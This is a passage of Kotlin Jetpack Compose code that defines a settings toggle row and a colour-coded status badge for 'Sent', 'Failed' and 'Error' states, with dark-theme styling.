        colors = OutlinedTextFieldDefaults.colors(
            focusedTextColor = TextPrimary,
            unfocusedTextColor = TextPrimary,
            focusedBorderColor = AccentIndigo,
            unfocusedBorderColor = CardBorder,
            focusedContainerColor = Color(0xFF0B101D),
            unfocusedContainerColor = Color(0xFF0B101D)
        ),
        modifier = Modifier.fillMaxWidth(),
        singleLine = true
    )
}

@Composable
fun SettingToggleRow(
    title: String,
    checked: Boolean,
    onCheckedChange: (Boolean) -> Unit
) {
    Row(
        modifier = Modifier.fillMaxWidth(),
        verticalAlignment = Alignment.CenterVertically,
        horizontalArrangement = Arrangement.SpaceBetween
    ) {
        Text(title, fontWeight = FontWeight.SemiBold, fontSize = 13.sp, color = TextPrimary)
        Switch(
            checked = checked,
            onCheckedChange = onCheckedChange,
            colors = SwitchDefaults.colors(
                checkedThumbColor = Color.White,
                checkedTrackColor = AccentIndigo,
                uncheckedThumbColor = Color.Gray,
                uncheckedTrackColor = Color(0xFF1E293B)
            )
        )
    }
}

@Composable
fun MncStatusBadge(label: String, status: String) {
    val bg = when (status) {
        "Sent" -> Color(0xFF064E3B)
        "Failed", "Error" -> Color(0xFF450A0A)
        else -> Color(0xFF1F2937)
    }
    val fg = when (status) {
        "Sent" -> Color(0xFF6EE7B7)
        "Failed", "Error" -> Color(0xFFFCA5A5)
        else -> TextMuted
    }
    Surface(
        color = bg,
        shape = RoundedCornerShape(4.dp),
        border = BorderStroke(1.dp, fg.copy(alpha = 0.3f)),
        modifier = Modifier.padding(vertical = 2.dp)
    ) {
        Text(
            text = "$label: $status",
            fontSize = 9.sp,
            fontWeight = FontWeight.SemiBold,
            color = fg,
            modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)
        )
    }
}
